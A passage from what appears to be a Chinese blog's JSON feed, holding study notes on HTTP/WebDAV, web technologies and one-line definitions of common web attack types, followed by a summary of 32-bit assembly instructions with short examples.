服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。</p>\n<p>除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的版本控制功能。</p>\n<h4 id=\"扩展-HTTP-1-1-的-WebDAV\"><a href=\"#扩展-HTTP-1-1-的-WebDAV\" class=\"headerlink\" title=\"扩展 HTTP/1.1 的 WebDAV\"></a>扩展 <strong>HTTP/1.1</strong> 的 <strong>WebDAV</strong></h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/0576a601ec5602848bee1800f36f65f3.png\"></p>\n<p>集合（<strong>Collection</strong>）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。</p>\n<p>资源（<strong>Resource</strong>）：把文件或集合称为资源。</p>\n<p>属性（<strong>Property</strong>）：定义资源的属性。定义以<strong>“</strong>名称 <strong>=</strong> 值<strong>”</strong>的格式执行。</p>\n<p>锁（<strong>Lock</strong>）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。</p>\n<h4 id=\"WebDAV-内新增的方法及状态码\"><a href=\"#WebDAV-内新增的方法及状态码\" class=\"headerlink\" title=\"WebDAV 内新增的方法及状态码\"></a><strong>WebDAV</strong> 内新增的方法及状态码</h4><p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。</p>\n<p><strong>PROPFIND</strong> ：获取属性</p>\n<p><strong>PROPPATCH</strong> ：修改属性</p>\n<p><strong>MKCOL</strong> ：创建集合</p>\n<p><strong>COPY</strong> ：复制资源及属性</p>\n<p><strong>MOVE</strong> ：移动资源</p>\n<p><strong>LOCK</strong> ：资源加锁</p>\n<p><strong>UNLOCK</strong> ：资源解锁</p>\n<p>为配合扩展的方法，状态码也随之扩展。</p>\n<p><strong>102 Processing</strong> ：可正常处理请求，但目前是处理中状态</p>\n<p><strong>207 Multi-Status</strong> ：存在多种状态</p>\n<p><strong>422 Unprocessible Entity</strong> ：格式正确，内容有误</p>\n<p><strong>423 Locked</strong> ：资源已被加锁</p>\n<p><strong>424 Failed Dependency</strong> ：处理与某请求关联的请求失败，因此不再维持依赖关系</p>\n<p><strong>507 Isufficient Storage</strong> ：保存空间不足</p>\n<ul>\n<li><p><strong>WebDAV</strong> 的请求实例</p>\n<p>下面是使用 PROPFIND 方法对 <a href=\"http://www.example.com/file\">http://www.example.com/file </a>发起获取属性的请求。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\">PROPFIND /file HTTP/1.1\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.example.com</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/xml; charset=\"utf-8\" Content-Length: 219</span></span>\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;\n&lt;D:propfind xmlns:D=\"DAV:\"&gt;\n&lt;D:prop xmlns:R=\"http://ns.example.com/boxschema/\"&gt;\n&lt;R:bigbox/&gt;\n&lt;R:author/&gt;\n&lt;R:DingALing/&gt;\n&lt;R:Random/&gt;\n&lt;/D:prop&gt;\n&lt;/D:propfind&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><strong>WebDAV</strong> 的响应实例</p>\n<p>下面是针对之前的 PROPFIND 方法，返回<a href=\"http://www.example.com/file\">http://www.example.com/file </a>的属性的响应。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">207</span> <span class=\"token reason-phrase string\">Multi-Status</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/xml; charset=\"utf-8\" Content-Length: 831</span></span>\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;\n&lt;D:multistatus xmlns:D=\"DAV:\"&gt;\n&lt;D:response xmlns:R=\"http://ns.example.com/boxschema/\"\n&lt;D:href&gt;http://www.example.com/file&lt;/D:href&gt;\n&lt;D:propstat&gt;\n&lt;D:prop&gt;\n&lt;R:bigbox&gt;\n&lt;R:BoxType&gt;Box type A&lt;/R:BoxType&gt;\n&lt;/R:bigbox&gt;\n&lt;R:author&gt;\n&lt;R:Name&gt;J.J. Johnson&lt;/R:Name&gt;\n&lt;/R:author&gt;\n&lt;/D:prop&gt;\n&lt;D:status&gt;HTTP/1.1 200 OK&lt;/D:status&gt;\n&lt;/D:propstat&gt;\n&lt;D:propstat&gt;\n&lt;D:prop&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;\n&lt;D:status&gt;HTTP/1.1 403 Forbidden&lt;/D:status&gt;\n&lt;D:responsedescription&gt; The user does not have acc\n&lt;/D:responsedescription&gt;\n&lt;/D:propstat&gt;\n&lt;/D:response&gt;\n&lt;D:responsedescription&gt; There has been an access viola\n&lt;/D:responsedescription&gt;\n&lt;/D:multistatus&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h2 id=\"构建-Web-内容的技术\"><a href=\"#构建-Web-内容的技术\" class=\"headerlink\" title=\"构建 Web 内容的技术\"></a>构建 <strong>Web</strong> 内容的技术</h2><h3 id=\"HTML\"><a href=\"#HTML\" class=\"headerlink\" title=\"HTML\"></a>HTML</h3><h5 id=\"Web-页面几乎全由-HTML-构建\"><a href=\"#Web-页面几乎全由-HTML-构建\" class=\"headerlink\" title=\"Web 页面几乎全由 HTML 构建\"></a><strong>Web</strong> 页面几乎全由 <strong>HTML</strong> 构建</h5><h5 id=\"HTML版本\"><a href=\"#HTML版本\" class=\"headerlink\" title=\"HTML版本\"></a>HTML版本</h5><h5 id=\"设计应用-CSS\"><a href=\"#设计应用-CSS\" class=\"headerlink\" title=\"设计应用 CSS\"></a>设计应用 <strong>CSS</strong></h5><h4 id=\"动态HTML\"><a href=\"#动态HTML\" class=\"headerlink\" title=\"动态HTML\"></a>动态HTML</h4><p>使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。</p>\n<h5 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h5><p>DOM 是用以操作 HTML 文档和 XML 文档的 API（Application Programming Interface，应用编程接口）。</p>\n<p>Web应用</p>\n<h4 id=\"通过-Web-提供功能的-Web-应用\"><a href=\"#通过-Web-提供功能的-Web-应用\" class=\"headerlink\" title=\"通过 Web 提供功能的 Web 应用\"></a>通过 <strong>Web</strong> 提供功能的 <strong>Web</strong> 应用</h4><p>由程序创建的内容称为动态内容，而事先准备好的内容称为静态内容。</p>\n<h4 id=\"与-Web-服务器及程序协作的-CGI\"><a href=\"#与-Web-服务器及程序协作的-CGI\" class=\"headerlink\" title=\"与 Web 服务器及程序协作的 CGI\"></a>与 <strong>Web</strong> 服务器及程序协作的 <strong>CGI</strong></h4><p>CGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的作用下，程序会对请求内容做出相应的动作，比如创建 HTML 等动态内容。</p>\n<p>使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等编程语言编写而成。</p>\n<h4 id=\"因-Java-而普及的-Servlet\"><a href=\"#因-Java-而普及的-Servlet\" class=\"headerlink\" title=\"因 Java 而普及的 Servlet\"></a>因 <strong>Java</strong> 而普及的 <strong>Servlet</strong></h4><p>Servlet 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java 语言实现的一个接口，属于面向企业级 Java（JavaEE，Java Enterprise Edition）的一部分。负载小。</p>\n<h3 id=\"数据发布的格式及语言\"><a href=\"#数据发布的格式及语言\" class=\"headerlink\" title=\"数据发布的格式及语言\"></a>数据发布的格式及语言</h3><h4 id=\"可扩展标记语言\"><a href=\"#可扩展标记语言\" class=\"headerlink\" title=\"可扩展标记语言\"></a>可扩展标记语言</h4><p>XML（eXtensible Markup Language，可扩展标记语言）是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数据共享变得更容易。</p>\n<p>XML 和 HTML 都是从标准通用标记语言 SGML（Standard Generalized Markup Language）简化而成。与 HTML 相比，它对数据的记录方式做了特殊处理。</p>\n<h4 id=\"发布更新信息的-RSS-Atom\"><a href=\"#发布更新信息的-RSS-Atom\" class=\"headerlink\" title=\"发布更新信息的 RSS/Atom\"></a>发布更新信息的 <strong>RSS/Atom</strong></h4><p>RSS（简易信息聚合，也叫聚合内容）和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。两者都用到了 XML。</p>\n<h4 id=\"JavaScript-衍生的轻量级易用-JSON\"><a href=\"#JavaScript-衍生的轻量级易用-JSON\" class=\"headerlink\" title=\"JavaScript 衍生的轻量级易用 JSON\"></a><strong>JavaScript</strong> 衍生的轻量级易用 <strong>JSON</strong></h4><p>JSON（JavaScript Object Notation）是一种以JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语言。</p>\n<h2 id=\"Web-的攻击技术\"><a href=\"#Web-的攻击技术\" class=\"headerlink\" title=\"Web 的攻击技术\"></a><strong>Web</strong> 的攻击技术</h2><h3 id=\"针对-Web-的攻击技术\"><a href=\"#针对-Web-的攻击技术\" class=\"headerlink\" title=\"针对 Web 的攻击技术\"></a>针对 <strong>Web</strong> 的攻击技术</h3><h4 id=\"HTTP-不具备必要的安全功能\"><a href=\"#HTTP-不具备必要的安全功能\" class=\"headerlink\" title=\"HTTP 不具备必要的安全功能\"></a><strong>HTTP</strong> 不具备必要的安全功能</h4><h4 id=\"在客户端即可篡改请求\"><a href=\"#在客户端即可篡改请求\" class=\"headerlink\" title=\"在客户端即可篡改请求\"></a>在客户端即可篡改请求</h4><h4 id=\"针对-Web-应用的攻击模式\"><a href=\"#针对-Web-应用的攻击模式\" class=\"headerlink\" title=\"针对 Web 应用的攻击模式\"></a>针对 <strong>Web</strong> 应用的攻击模式</h4><ul>\n<li>主动攻击</li>\n<li>被动攻击</li>\n<li>以服务器为目标的主动攻击</li>\n<li>以服务器为目标的被动攻</li>\n</ul>\n<h3 id=\"因输出值转义不完全引发的安全漏洞\"><a href=\"#因输出值转义不完全引发的安全漏洞\" class=\"headerlink\" title=\"因输出值转义不完全引发的安全漏洞\"></a>因输出值转义不完全引发的安全漏洞</h3><ul>\n<li>客户端的验证</li>\n<li><strong>Web</strong> 应用端（服务器端）的验证<ul>\n<li>输入值验证</li>\n<li>输出值转义</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"跨站脚本攻击（Cross-Site-Scripting，XSS）\"><a href=\"#跨站脚本攻击（Cross-Site-Scripting，XSS）\" class=\"headerlink\" title=\"跨站脚本攻击（Cross-Site Scripting，XSS）\"></a>跨站脚本攻击（Cross-Site Scripting，XSS）</h4><p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。</p>\n<h4 id=\"SQL-注入（SQL-Injection）\"><a href=\"#SQL-注入（SQL-Injection）\" class=\"headerlink\" title=\"SQL 注入（SQL Injection）\"></a>SQL 注入（SQL Injection）</h4><h4 id=\"OS-命令注入攻击（OS-Command-Injection）\"><a href=\"#OS-命令注入攻击（OS-Command-Injection）\" class=\"headerlink\" title=\"OS 命令注入攻击（OS Command Injection）\"></a>OS 命令注入攻击（OS Command Injection）</h4><h4 id=\"HTTP-首部注入攻击（HTTP-Header-Injection）\"><a href=\"#HTTP-首部注入攻击（HTTP-Header-Injection）\" class=\"headerlink\" title=\"HTTP 首部注入攻击（HTTP Header Injection）\"></a>HTTP 首部注入攻击（HTTP Header Injection）</h4><h4 id=\"邮件首部注入（Mail-Header-Injection）\"><a href=\"#邮件首部注入（Mail-Header-Injection）\" class=\"headerlink\" title=\"邮件首部注入（Mail Header Injection）\"></a>邮件首部注入（Mail Header Injection）</h4><h4 id=\"目录遍历（Directory-Traversal）攻击\"><a href=\"#目录遍历（Directory-Traversal）攻击\" class=\"headerlink\" title=\"目录遍历（Directory Traversal）攻击\"></a>目录遍历（Directory Traversal）攻击</h4><h4 id=\"远程文件包含漏洞（Remote-File-Inclusion）\"><a href=\"#远程文件包含漏洞（Remote-File-Inclusion）\" class=\"headerlink\" title=\"远程文件包含漏洞（Remote File Inclusion）\"></a>远程文件包含漏洞（Remote File Inclusion）</h4><h3 id=\"因设置或设计上的缺陷引发的安全漏洞\"><a href=\"#因设置或设计上的缺陷引发的安全漏洞\" class=\"headerlink\" title=\"因设置或设计上的缺陷引发的安全漏洞\"></a>因设置或设计上的缺陷引发的安全漏洞</h3><h4 id=\"强制浏览（Forced-Browsing）\"><a href=\"#强制浏览（Forced-Browsing）\" class=\"headerlink\" title=\"强制浏览（Forced Browsing）\"></a>强制浏览（Forced Browsing）</h4><p>强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</p>\n<h4 id=\"不正确的错误消息处理（Error-Handling-Vulnerability）\"><a href=\"#不正确的错误消息处理（Error-Handling-Vulnerability）\" class=\"headerlink\" title=\"不正确的错误消息处理（Error Handling Vulnerability）\"></a>不正确的错误消息处理（Error Handling Vulnerability）</h4><p>不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。</p>\n<h4 id=\"开放重定向（Open-Redirect）\"><a href=\"#开放重定向（Open-Redirect）\" class=\"headerlink\" title=\"开放重定向（Open Redirect）\"></a>开放重定向（Open Redirect）</h4><p>开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。</p>\n<h3 id=\"因会话管理疏忽引发的安全漏洞\"><a href=\"#因会话管理疏忽引发的安全漏洞\" class=\"headerlink\" title=\"因会话管理疏忽引发的安全漏洞\"></a>因会话管理疏忽引发的安全漏洞</h3><h4 id=\"会话劫持（Session-Hijack）\"><a href=\"#会话劫持（Session-Hijack）\" class=\"headerlink\" title=\"会话劫持（Session Hijack）\"></a>会话劫持（Session Hijack）</h4><p>会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。</p>\n<h4 id=\"会话固定攻击\"><a href=\"#会话固定攻击\" class=\"headerlink\" title=\"会话固定攻击\"></a>会话固定攻击</h4><p>对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。</p>\n<h4 id=\"跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）\"><a href=\"#跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）\" class=\"headerlink\" title=\"跨站点请求伪造（Cross-Site Request Forgeries，CSRF）\"></a>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）</h4><p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>\n<h3 id=\"其他安全漏洞\"><a href=\"#其他安全漏洞\" class=\"headerlink\" title=\"其他安全漏洞\"></a>其他安全漏洞</h3><h4 id=\"密码破解攻击（Password-Cracking）\"><a href=\"#密码破解攻击（Password-Cracking）\" class=\"headerlink\" title=\"密码破解攻击（Password Cracking）\"></a>密码破解攻击（Password Cracking）</h4><p>密码破解攻击（Password Cracking）即算出密码，突破认证。</p>\n<h4 id=\"点击劫持（Clickjacking）\"><a href=\"#点击劫持（Clickjacking）\" class=\"headerlink\" title=\"点击劫持（Clickjacking）\"></a>点击劫持（Clickjacking）</h4><p>点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。</p>\n<h4 id=\"DoS-攻击（Denial-of-Service-attack）\"><a href=\"#DoS-攻击（Denial-of-Service-attack）\" class=\"headerlink\" title=\"DoS 攻击（Denial of Service attack）\"></a>DoS 攻击（Denial of Service attack）</h4><p>DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。</p>\n<h4 id=\"后门程序（Backdoor）\"><a href=\"#后门程序（Backdoor）\" class=\"headerlink\" title=\"后门程序（Backdoor）\"></a>后门程序（Backdoor）</h4><p>后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。</p>\n",
            "tags": [
                "学习"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/01/03/zhi-ling/",
            "url": "https://0xdadream.github.io/2021/01/03/zhi-ling/",
            "title": "32位汇编指令总结(代码示例)",
            "date_published": "2021-01-02T18:00:00.000Z",
            "content_html": "<h1 id=\"通用数据传送指令\"><a href=\"#通用数据传送指令\" class=\"headerlink\" title=\"通用数据传送指令\"></a>通用数据传送指令</h1><h3 id=\"MOV-传送字或字节\"><a href=\"#MOV-传送字或字节\" class=\"headerlink\" title=\"MOV 传送字或字节\"></a>MOV 传送字或字节</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,10h<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"MOVSX-先符号扩展-再传送\"><a href=\"#MOVSX-先符号扩展-再传送\" class=\"headerlink\" title=\"MOVSX 先符号扩展,再传送\"></a>MOVSX 先符号扩展,再传送</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">movsx eax,ax;先进行全零扩展,前16位为F<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"MOVZX-先零扩展-再传送\"><a href=\"#MOVZX-先零扩展-再传送\" class=\"headerlink\" title=\"MOVZX 先零扩展,再传送\"></a>MOVZX 先零扩展,再传送</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">movzx eax,ax;先进行全零扩展,前16位为0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"PUSH-把字压入堆栈\"><a href=\"#PUSH-把字压入堆栈\" class=\"headerlink\" title=\"PUSH 把字压入堆栈\"></a>PUSH 把字压入堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">push reg/nem16   32\npush imm32<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"POP-把字弹出堆栈\"><a href=\"#POP-把字弹出堆栈\" class=\"headerlink\" title=\"POP 把字弹出堆栈\"></a>POP 把字弹出堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">pop reg/nem16  32<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"PUSHFD-把32EFLAGS寄存器内容压入堆栈\"><a href=\"#PUSHFD-把32EFLAGS寄存器内容压入堆栈\" class=\"headerlink\" title=\"PUSHFD 把32EFLAGS寄存器内容压入堆栈\"></a>PUSHFD 把32EFLAGS寄存器内容压入堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">pushfd;保存标志寄存器内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"POPFD-把32EFLAGS寄存器内容弹出堆栈\"><a href=\"#POPFD-把32EFLAGS寄存器内容弹出堆栈\" class=\"headerlink\" title=\"POPFD 把32EFLAGS寄存器内容弹出堆栈\"></a>POPFD 把32EFLAGS寄存器内容弹出堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">popfd;恢复标志寄存器内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈\"><a href=\"#PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈\" class=\"headerlink\" title=\"PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈\"></a>PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">pusha;保存16通用寄存器内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈\"><a href=\"#POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈\" class=\"headerlink\" title=\"POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈\"></a>POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">popa;恢复16通用寄存器内存<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈\"><a href=\"#PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈\" class=\"headerlink\" title=\"PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈\"></a>PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">pushad;保存32通用寄存器内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈\"><a href=\"#POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈\" class=\"headerlink\" title=\"POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈\"></a>POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">popad;恢复32通用寄存器内存<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"BSWAP-交换32位寄存器里字节的顺序\"><a href=\"#BSWAP-交换32位寄存器里字节的顺序\" class=\"headerlink\" title=\"BSWAP 交换32位寄存器里字节的顺序\"></a>BSWAP 交换32位寄存器里字节的顺序</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">;EAX=96688368H\nBSWAP EAX;EAX=68836896H<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数\"><a href=\"#XCHG-交换字或字节-至少有一个操作数为寄存器-段寄存器不可作为操作数\" class=\"headerlink\" title=\"XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)\"></a>XCHG 交换字或字节( 至少有一个操作数为寄存器,段寄存器不可作为操作数)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">xchg ax,hx\nxchg ah,al\nxchg eax,ebx\nxchg var,ax;var16位<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX\"><a href=\"#CMPXCHG-比较并交换操作数-第二个操作数必须为累加器AL-AX-EAX\" class=\"headerlink\" title=\"CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )\"></a>CMPXCHG 比较并交换操作数( 第二个操作数必须为累加器AL/AX/EAX )</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">CMPXCHG CX,DX\n;如果指令执行前 (AX)=2300H,(CX)=2300H.(DX)=2400H\n;则指令执行后 因（CX）=(AX),故(CX)=2400H,ZF=1\n;如果指令执行前（AX）=2500H,(CX)=2300H,(DX)=2400H\n;则指令执行后因（CX）!=(AX)，故(AX)=2300H，ZF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"XADD-先交换再累加-结果在第一个操作数里\"><a href=\"#XADD-先交换再累加-结果在第一个操作数里\" class=\"headerlink\" title=\"XADD 先交换再累加( 结果在第一个操作数里 )\"></a>XADD 先交换再累加( 结果在第一个操作数里 )</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">xadd eax，ecx\n;相当于：\n\t先执行：\n\t\txchg eax,ecx\n\t然后执行：\n\t\tadd eax,ecx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"XLAT-字节查表转换\"><a href=\"#XLAT-字节查表转换\" class=\"headerlink\" title=\"XLAT 字节查表转换\"></a>XLAT 字节查表转换</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">X DW 1122h,3344h,5566h,7788h\nlea bx,X\nmov al,03h\nxlat<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即 0-FFH); 返回 AL 为查表结果 ( [BX+AL]-&gt;AL )</p>\n<h1 id=\"输入输出端口传送指令\"><a href=\"#输入输出端口传送指令\" class=\"headerlink\" title=\"输入输出端口传送指令\"></a>输入输出端口传送指令</h1><h3 id=\"IN-I-O端口输入\"><a href=\"#IN-I-O端口输入\" class=\"headerlink\" title=\"IN I/O端口输入\"></a>IN I/O端口输入</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">语法: IN 累加器, {端口号│DX}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"OUT-I-O端口输出\"><a href=\"#OUT-I-O端口输出\" class=\"headerlink\" title=\"OUT I/O端口输出\"></a>OUT I/O端口输出</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">语法: OUT {端口号│DX},累加器<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535\"><a href=\"#输入输出端口由立即方式指定时-其范围是-0-255-由寄存器-DX-指定时-其范围是-0-65535\" class=\"headerlink\" title=\"输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535\"></a>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535</h3><h1 id=\"目的地址传送指令\"><a href=\"#目的地址传送指令\" class=\"headerlink\" title=\"目的地址传送指令\"></a>目的地址传送指令</h1><h3 id=\"LEA-装入有效地址\"><a href=\"#LEA-装入有效地址\" class=\"headerlink\" title=\"LEA 装入有效地址\"></a>LEA 装入有效地址</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">LEA DX,string ;把偏移地址存到DX<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LDS-传送目标指针-把指针内容装入DS\"><a href=\"#LDS-传送目标指针-把指针内容装入DS\" class=\"headerlink\" title=\"LDS 传送目标指针,把指针内容装入DS\"></a>LDS 传送目标指针,把指针内容装入DS</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">LDS SI,string ;把段地址:偏移地址存到DS:SI<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LES-传送目标指针-把指针内容装入ES\"><a href=\"#LES-传送目标指针-把指针内容装入ES\" class=\"headerlink\" title=\"LES 传送目标指针,把指针内容装入ES\"></a>LES 传送目标指针,把指针内容装入ES</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">LES DI,string ;把段地址:偏移地址存到ESDI<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LFS-传送目标指针-把指针内容装入FS\"><a href=\"#LFS-传送目标指针-把指针内容装入FS\" class=\"headerlink\" title=\"LFS 传送目标指针,把指针内容装入FS\"></a>LFS 传送目标指针,把指针内容装入FS</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">LFS DI,string ;把段地址:偏移地址存到FSD<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LGS-传送目标指针-把指针内容装入GS\"><a href=\"#LGS-传送目标指针-把指针内容装入GS\" class=\"headerlink\" title=\"LGS 传送目标指针,把指针内容装入GS\"></a>LGS 传送目标指针,把指针内容装入GS</h3><pre class=\"line-numbers 